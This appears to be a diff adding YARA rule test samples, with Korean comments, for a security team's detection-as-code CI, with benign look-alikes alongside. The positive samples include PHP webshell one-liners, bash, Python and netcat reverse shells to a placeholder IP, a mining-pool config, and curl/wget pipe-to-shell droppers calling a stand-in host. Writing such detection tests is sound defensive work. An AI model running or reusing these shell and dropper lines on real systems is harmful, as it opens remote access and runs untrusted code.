@@ -1,0 +1,83 @@
+# YARA 룰의 정탐/오탐 샘플 — CI 가 매 push 마다 검증한다 (detection-as-code).
+#
+# YARA 의 meta 는 스칼라만 담을 수 있어 Sigma 처럼 룰 파일 안에 테스트를 넣지
+# 못한다. 그래서 룰 이름을 키로 하는 이 파일에 둔다.
+#
+# **negative 가 핵심이다.** 오탐은 조용히 쌓이다가 분석가가 알림을 무시하게
+# 만드는 방식으로 탐지 체계를 망가뜨린다. 정상 파일 샘플을 반드시 넣을 것.
+
+SOC_EICAR_Test_File:
+  positive:
+    - name: EICAR 표준 테스트 문자열
+      content: 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+  negative:
+    - name: EICAR 를 언급만 하는 문서
+      content: "이 문서는 EICAR 테스트 파일 사용법을 설명합니다."
+
+SOC_PHP_Webshell:
+  positive:
+    - name: 전형적인 eval 웹셸
+      content: "<?php eval($_POST['cmd']); ?>"
+    - name: system + GET 파라미터
+      content: "<?php system($_GET['c']); ?>"
+  negative:
+    - name: 평범한 PHP 출력
+      content: "<?php echo 'hello world'; ?>"
+    - name: eval 을 쓰지만 사용자 입력이 아님
+      content: "<?php eval('$x = 1;'); ?>"
+    - name: PHP 가 아닌 자바스크립트의 eval
+      content: "const f = () => eval(localStorage.getItem('cfg'));"
+
+SOC_Reverse_Shell_Script:
+  positive:
+    - name: bash /dev/tcp 리버스 셸
+      content: "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
+    - name: python pty 리버스 셸
+      content: |
+        import socket,os,pty
+        s=socket.socket(); s.connect(("203.0.113.10",4444))
+        os.dup2(s.fileno(),0); pty.spawn("/bin/bash")
+    - name: netcat -e
+      content: "nc -e /bin/sh 203.0.113.10 4444"
+  negative:
+    - name: 평범한 배포 스크립트
+      content: "#!/bin/bash\nset -e\nbash /opt/deploy/release.sh --env prod"
+    - name: 소켓만 쓰는 정상 파이썬 서비스
+      content: |
+        import socket
+        s = socket.socket()
+        s.bind(("0.0.0.0", 8080))
+
+SOC_Cryptominer_Artifact:
+  positive:
+    - name: 채굴 풀 접속 설정
+      content: '{"pools":[{"url":"stratum+tcp://pool.minexmr.com:4444"}]}'
+    - name: xmrig 바이너리 문자열
+      content: "xmrig 6.20.0 built for Linux"
+  negative:
+    - name: 커넥션 풀 설정 (Sigma 쪽에서 오탐이었던 그 패턴)
+      content: 'spring.datasource.hikari.maximum-pool-size=20'
+    - name: 평범한 JSON 설정
+      content: '{"workers": 4, "pool_timeout": 30}'
+
+SOC_UPX_Packed_ELF:
+  positive:
+    - name: UPX 로 패킹된 ELF 헤더
+      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAVVBYIQ=="
+  negative:
+    - name: 패킹되지 않은 ELF
+      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAA=="
+    - name: UPX 를 언급하는 텍스트 (ELF 아님)
+      content: "UPX! 로 패킹된 바이너리는 언패킹 후 분석한다"
+
+SOC_Curl_Pipe_Shell_Dropper:
+  positive:
+    - name: curl 파이프 bash
+      content: "curl -s http://malware.example/x.sh | bash"
+    - name: wget 파이프 sh (공백 없음)
+      content: "wget -qO- http://malware.example/x |sh"
+  negative:
+    - name: 평범한 헬스체크
+      content: "curl -sf https://api.example.com/health || exit 1"
+    - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
+      content: "cat /opt/setup.sh | bash"
